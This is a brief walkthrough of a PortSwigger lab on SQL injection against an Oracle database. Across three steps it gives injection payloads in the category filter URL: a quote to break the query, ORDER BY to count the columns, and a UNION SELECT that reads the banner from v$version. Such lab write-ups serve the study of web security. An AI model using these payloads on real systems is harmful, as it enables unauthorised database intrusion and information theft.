# SQL injection attack, querying the database type and version on Oracle

**Lab Url**: [https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle](https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle)

## Objective

This lab contains a SQL injection vulnerability in the product category filter. You can use a UNION attack to retrieve the results from an injected query.

To solve the lab, display the database version string.

## Solution

The category filter is vulnerable to SQL injection. We can use a `UNION` attack to retrieve the Oracle database version.

### Step 1: Confirm injection

Append an apostrophe to the category value:

```bash
/filter?category=Accessories'
```

A **500 Internal Server Error** confirms broken SQL syntax.

### Step 2: Determine the number of columns

Use `ORDER BY` to find the column count:

```bash
/filter?category=Accessories' ORDER BY 2--
```

The query returns **two columns**.

### Step 3: Retrieve the database version

Oracle stores version information in the `v$version` view. Use a `UNION SELECT` to extract the `banner` column:

```bash
/filter?category=Accessories' UNION SELECT NULL, banner FROM v$version--
```

The response displays the Oracle database version string.
